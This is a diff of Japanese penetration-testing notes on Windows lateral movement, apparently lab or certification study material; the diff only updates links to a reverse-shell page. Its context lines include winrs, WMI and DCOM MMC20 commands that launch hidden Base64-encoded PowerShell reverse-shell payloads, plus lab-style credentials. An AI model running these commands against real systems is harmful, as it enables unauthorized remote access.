@@ -71,7 +71,7 @@ winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
 ```
 
 リバースシェルの実行
-	[Base64化したPowerShellリバースシェルワンライナー](../../Common/What%20is%20the%20shell.md#Base64化したPowerShellリバースシェルワンライナー)
+	[Base64化したPowerShellリバースシェルワンライナー](../../Common/Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md#Base64化したPowerShellリバースシェルワンライナー)
 ```cmd
 winrs -r:<target_IP> -u:<username> -p:<password> "powershell -nop -w hidden -e <Base64EncodedPayload>"
 ```
@@ -124,7 +124,7 @@ $session = New-CimSession -ComputerName <target_IP> -Credential $credential -Ses
 ### (a)コマンド（リバースシェル）の実行
 
 1. リバースシェルペイロードをエンコードする
-	- [Base64化したPowerShellリバースシェルワンライナー](../../Common/What%20is%20the%20shell.md#Base64化したPowerShellリバースシェルワンライナー)
+	- [Base64化したPowerShellリバースシェルワンライナー](../../Common/Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md#Base64化したPowerShellリバースシェルワンライナー)
 
 2. WMIで実行する
 ```powershell
@@ -367,7 +367,7 @@ $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Appl
 ```
 
 2. リバースシェルのコマンドを実行する
-	- [Base64化したPowerShellリバースシェルワンライナー](../../Common/What%20is%20the%20shell.md#Base64化したPowerShellリバースシェルワンライナー)
+	- [Base64化したPowerShellリバースシェルワンライナー](../../Common/Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md#Base64化したPowerShellリバースシェルワンライナー)
 ```powershell
 $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <EncodedPayload>","7")
 ```
